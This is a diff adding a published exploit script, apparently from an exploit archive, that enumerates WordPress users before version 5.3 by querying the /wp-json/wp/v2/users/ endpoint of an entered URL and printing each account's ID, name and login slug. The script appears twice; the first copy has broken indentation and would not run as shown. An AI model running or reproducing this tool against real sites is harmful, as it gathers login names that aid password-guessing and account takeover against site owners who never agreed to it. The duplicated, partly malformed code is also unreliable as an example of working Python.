@@ -1,0 +1,112 @@
+# Exploit Title : Wordpress 5.3 - User Disclosure
+# Author: SajjadBnd
+# Date: 2019-11-17
+# Software Link: https://wordpress.org/download/
+# version : wp < 5.3
+# tested on : Ubunutu 18.04 / python 2.7
+# CVE: N/A
+
+
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#
+
+ 
+import requests
+import os
+import re
+import json
+import sys
+import urllib3
+ 
+def clear():
+    linux = 'clear'
+    windows = 'cls'
+    os.system([linux, windows][os.name == 'nt'])
+def Banner():
+        print('''
+- Wordpress < 5.3 - User Enumeration
+- SajjadBnd
+''')
+def Desc():
+    url = raw_input('[!] Url >> ')
+    vuln = url + "/wp-json/wp/v2/users/"
+    while True:
+        try:
+            r = requests.get(vuln,verify=False)
+            content = json.loads(r.text)
+            data(content)
+        except requests.exceptions.MissingSchema:
+        vuln = "http://" + vuln
+def data(content):
+    for x in content:
+    name = x["name"].encode('UTF-8')
+    print("======================")
+    print("[+] ID : " + str(x["id"]))
+    print("[+] Name : " + name)
+    print("[+] User : " + x["slug"])
+    sys.exit(1)
+if __name__ == '__main__':
+    urllib3.disable_warnings()
+    reload(sys)
+    sys.setdefaultencoding('UTF8')
+    clear()
+    Banner()
+    Desc()
+
+wpuser.txt
+
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#
+# Exploit Title : Wordpress < 5.3 - User Disclosure
+# Exploit Author: SajjadBnd
+# email : blackwolf@post.com
+# Software Link: https://wordpress.org/download/
+# version : wp < 5.3
+# tested on : Ubunutu 18.04 / python 2.7
+
+import requests
+import os
+import re
+import json
+import sys
+import urllib3
+
+def clear():
+    linux = 'clear'
+    windows = 'cls'
+    os.system([linux, windows][os.name == 'nt'])
+
+def Banner():
+        print('''
+- Wordpress < 5.3 - User Enumeration
+- SajjadBnd
+''')
+
+def Desc():
+    url = raw_input('[!] Url >> ')
+    vuln = url + "/wp-json/wp/v2/users/"
+    while True:
+        try:
+            r = requests.get(vuln,verify=False)
+            content = json.loads(r.text)
+            data(content)
+    	except requests.exceptions.MissingSchema:
+	    vuln = "http://" + vuln
+
+def data(content):
+    for x in content:
+	name = x["name"].encode('UTF-8')
+	print("======================")
+	print("[+] ID : " + str(x["id"]))
+	print("[+] Name : " + name)
+	print("[+] User : " + x["slug"])
+    sys.exit(1)
+if __name__ == '__main__':
+    urllib3.disable_warnings()
+    reload(sys)
+    sys.setdefaultencoding('UTF8')
+    clear()
+    Banner()
+    Desc()
